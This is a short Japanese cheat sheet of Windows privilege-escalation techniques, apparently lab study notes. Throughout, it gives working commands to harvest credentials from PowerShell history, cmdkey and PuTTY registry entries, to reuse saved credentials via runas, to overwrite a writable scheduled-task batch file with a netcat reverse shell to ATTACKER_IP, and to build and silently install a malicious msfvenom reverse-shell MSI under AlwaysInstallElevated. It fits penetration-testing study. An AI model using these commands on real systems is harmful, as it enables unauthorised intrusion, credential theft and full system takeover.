# Windows権限昇格手法  


### PowerShellのログを確認する  

``` type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt ```  
<br>※また、PowerShellで実行する場合には%userprofile%を$Env:userprofileに変更する必要がある  



  ### Windows内に保存されているクレデンシャル情報を確認する  
  ```cmdkey /list```
実際のパスワードを見ることはできませんが、試す価値のある認証情報があれば、以下のようにrunasコマンドと/savecredオプションで使用することが可能
```runas /savecred /user:admin cmd.exe```


### Puttyに保存されている平文の認証情報を含むプロキシパスワードを確認する
```reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s```


### スケジュールタスクを調べて書き換え可能なバイナリがないかを調べる
``` schtasks /query /tn vulntask /fo list /v```
##### また、出力結果内で重要となってくるのが"Task to Run"と"Run As User"という項目で<br>もし、現在のユーザーが "Task to Run "実行ファイルを変更または上書きすることができれば<br>taskusr1ユーザーによって実行されるものを制御することができ、結果として単純な特権の昇格を実現することができる。
``` 
C:\> icacls c:\tasks\schtask.bat
c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)
```

##### (I)と(F)は権限のことで、(F)はフルアクセスを指している。
つまり今回の例だとこのバッチファイルをリバールシェルに書き換えればrootになれる  
以下はバッチをリバースシェルに書き換える例  
``` C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat ```



### msiファイルを利用して権限昇格する
msiでは任意のユーザーアカウント（非特権ユーザーも含む）から、より高い特権で実行されるように設定することができる。  
これにより、管理者権限で実行される悪意のあるMSIファイルを生成することができるが、それには以下の2うのレジストリ値を設定する必要がある。
```
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
以下はmsfvenomでmsi形式のリバースシェルを生成する例
```msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi```
<br>生成したファイルをターゲットPCに送り込んで実行する例
```C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi```
